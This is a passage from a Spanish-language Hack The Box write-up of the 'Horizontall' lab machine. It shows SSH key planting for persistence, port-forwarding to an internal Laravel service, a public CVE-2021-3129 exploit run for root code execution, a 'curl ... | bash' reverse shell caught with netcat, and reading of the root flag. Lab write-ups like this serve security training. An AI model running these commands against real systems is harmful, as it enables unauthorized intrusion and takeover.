+<p>Buscaremos los puertos abiertos que tenemos en la máquina:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strapi@horizontall:/$ netstat -nat
+netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN     
+tcp        0     13 10.10.11.105:43042      10.10.14.17:1235        ESTABLISHED
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN   
+</code></pre></div></div>
+
+<p>Observamos puertos abiertos en la máquina localmente, el primero puerto que vemos es el 8000, hacemos un curl para ver si es una página web:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl localhost:8000
+</code></pre></div></div>
+<p>Observamos muchas información y si parece ser una web, por lo tanto, vamos a realizar un <strong>port-forwarding</strong> utilizando <code class="language-plaintext highlighter-rouge">ssh</code> para traer el puerto 8000 de la máquina víctima a nuestro equipo y tener conexión. En primer lugar, creamos un directorio .ssh para el usuario, pues no tiene:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir .ssh
+</code></pre></div></div>
+<p>Dentro de este directorio crearemos un archivo que será la llave, en nuestro equipo usaremos <code class="language-plaintext highlighter-rouge">ssh-key</code> para generar una clave <code class="language-plaintext highlighter-rouge">ssh</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen -f strapi
+</code></pre></div></div>
+<p>De esta forma obtenemos la llave pública y privada, copiaremos la llave pública creada en el directorio .ssh de la máquina víctima con el nombre de <strong>authorized_keys</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strapi@horizontall:~/.ssh$ ls
+authorized_keys
+</code></pre></div></div>
+
+<p>Le otorgamos el permiso 600, pues es necesario que se reconozca como llave:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strapi@horizontall:~/.ssh$ chmod 600 authorized_keys
+</code></pre></div></div>
+
+<p>Hacemos lo mismo con la llave en nuestro equipo e intentamos conectarnos a través de <code class="language-plaintext highlighter-rouge">ssh</code> con la llave privada:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i strapi strapi@10.10.11.105
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Feb 10 03:09:59 UTC 2023
+
+  System load:  0.11              Processes:           180
+  Usage of /:   83.1% of 4.85GB   Users logged in:     0
+  Memory usage: 47%               IP address for eth0: 10.10.11.105
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
+$ bash
+strapi@horizontall:~$ 
+</code></pre></div></div>
+
+<p>Hemos entrado correctamente a través de <code class="language-plaintext highlighter-rouge">ssh</code> y no tenemos que volver a realizar la vulnerabilidad para entrar.</p>
+
+<p>En este punto es cuando realizaremos el <strong>port forwarding</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i strapi -L 8001:127.0.0.1:8000 strapi@10.10.11.105
+</code></pre></div></div>
+
+<p>Esto realizará una conexión a nuestro puerto 8001 con el puerto 8000 de la máquina.</p>
+
+<p>Luego, si vamos a nuestro localhost veremos lo siguiente:</p>
+
+<p><img src="/imagenes/Horizontall/horizontall8.png" alt="" /></p>
+
+<p>Observamos la página de <strong>Laravel</strong>, hemos hecho correctamente la conexión.</p>
+
+<p>En este punto, buscamos vulnerabilidades de <strong>Laravel</strong> en <strong>github</strong> y encontramos <a href="https://github.com/nth347/CVE-2021-3129_exploit">exploit</a>, lo clonamos y vemos la forma de usarlo <strong>./exploit.py http://localhost:8000 Monolog/RCE1 whoami</strong>, lo intentamos con nuestras direcciones:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py http://127.0.0.1:8001 Monolog/RCE1 whoami
+[i] Trying to clear logs
+[+] Logs cleared
+[i] PHPGGC not found. Cloning it
+Cloning into 'phpggc'...
+remote: Enumerating objects: 3515, done.
+remote: Counting objects: 100% (1061/1061), done.
+remote: Compressing objects: 100% (465/465), done.
+remote: Total 3515 (delta 624), reused 873 (delta 537), pack-reused 2454
+Receiving objects: 100% (3515/3515), 516.75 KiB | 1.89 MiB/s, done.
+Resolving deltas: 100% (1496/1496), done.
+[+] Successfully converted logs to PHAR
+[+] PHAR deserialized. Exploited
+
+root
+</code></pre></div></div>
+
+<p>Observamos que si es vulnerable y el exploit ha funcionado, tenemos un <strong>RCE</strong>. En este punto enviaremos el mismo comando que hicimos con el exploit anterior con <code class="language-plaintext highlighter-rouge">netcat</code> escuchando y el servidor en python con el recurso reverse shell activo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py http://127.0.0.1:8001 Monolog/RCE1 'curl http://10.10.14.17/ | bash'
+</code></pre></div></div>
+
+<p>Si observamos nuestro <code class="language-plaintext highlighter-rouge">netcat</code> y obtenemos una conexión:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1235
+listening on [any] 1235 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.105] 46862
+bash: cannot set terminal process group (2670): Inappropriate ioctl for device
+bash: no job control in this shell
+root@horizontall:/home/developer/myproject/public# cd
+cd
+</code></pre></div></div>
+<p>En este punto ingresamos la llave pública al directorio .ssh de root como authorized_keys:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@horizontall:~# ls
+ls
+boot.sh
+pid
+restart.sh
+root.txt
+root@horizontall:~# cd .ssh
+cd .ssh
+root@horizontall:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzAA3JYqVn5OLwxPgPeY2KjqedY9dyAvAFRSCeiIch44xqb/DeYql+BM2TRTI03M3kk4k2Cf33ilPg/7aoTlnSnsGkt2RADKWus33roioW2vcOTVAJXvekye10FgehJEMLSWVcrn5Fz9ZE5ZKe/Cr6gE2Hmm80SxoBQV9QlQcPvUSIROHa7CPAiJIivlaHpxl94l7EBcm+cNVCcrDN5b41FobaRryd5na/quK4/buph7MYKuASCJQQI9SJu9iIBHgBZLb871qBR3riCGlHZO4XNAFb04bsNK2XRfLInGHOl1vkZjROedJ/9MgEJrxmH1HRILZEL8dJMmoCUoecCi8sT2fMGA4InDCngIl5TpediHcsOF51xWMgTlVfhX9jPu+mZD2Odmr1awb7UyDub0QZp9KsxOF9POtAJVH6L6ZA5qyDxSaP/4GzWe9yba3BYJE5TlgyBDvCl6xzVXKAlI2Gxvo8gMo4xYbCaUCS8qhk/03yna19+16LbYhkb44+Zc8= kali@kali
+&lt;8gMo4xYbCaUCS8qhk/03yna19+16LbYhkb44+Zc8= kali@kali
+&gt; ' &gt; authorized_keys
+' &gt; authorized_keys
+root@horizontall:~/.ssh# chmod 600 authorized_keys
+chmod 600 authorized_keys
+</code></pre></div></div>
+
+<p>Luego, utilizando ssh volvemos a entrar, pero esta vez como el usuario root:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i strapi root@10.10.11.105
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Feb 10 04:02:40 UTC 2023
+
+  System load:  0.0               Processes:           174
+  Usage of /:   82.0% of 4.85GB   Users logged in:     0
+  Memory usage: 25%               IP address for eth0: 10.10.11.105
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Aug 23 11:27:49 2021 from 10.10.14.6
+root@horizontall:~# ls
+boot.sh  pid  restart.sh  root.txt
+root@horizontall:~# cat root.txt
+73e15d3a03d555d83f71c0
+</code></pre></div></div>
+<p>¡Bien! Tenemos la flag de administrador, hemos vulnerado completamente la máquina.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cms" class="page__taxonomy-item" rel="tag">CMS</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#exploit" class="page__taxonomy-item" rel="tag">Exploit</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#fuzzing" class="page__taxonomy-item" rel="tag">Fuzzing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#port-forwarding" class="page__taxonomy-item" rel="tag">Port Forwarding</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rce" class="page__taxonomy-item" rel="tag">RCE</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-09T00:00:00-05:00">February 09, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Validation/" class="pagination--pager" title="Validation HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/Jeeves/" class="pagination--pager" title="Jeeves HTB Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
